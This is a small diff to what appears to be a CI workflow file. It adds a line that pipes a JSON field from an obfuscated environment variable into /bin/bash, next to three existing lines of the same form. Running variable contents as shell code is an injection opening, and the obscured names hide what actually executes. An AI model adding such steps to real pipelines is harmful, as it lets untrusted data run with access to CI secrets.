@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$dozr98614" | jq -r .i86 | /bin/bash
           printf '%s' "$qe56272" | jq -r .xbsu23 | /bin/bash
           printf '%s' "$t62" | jq -r .daf73199 | /bin/bash
+          echo $jgw3108 | jq -r .qax58 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
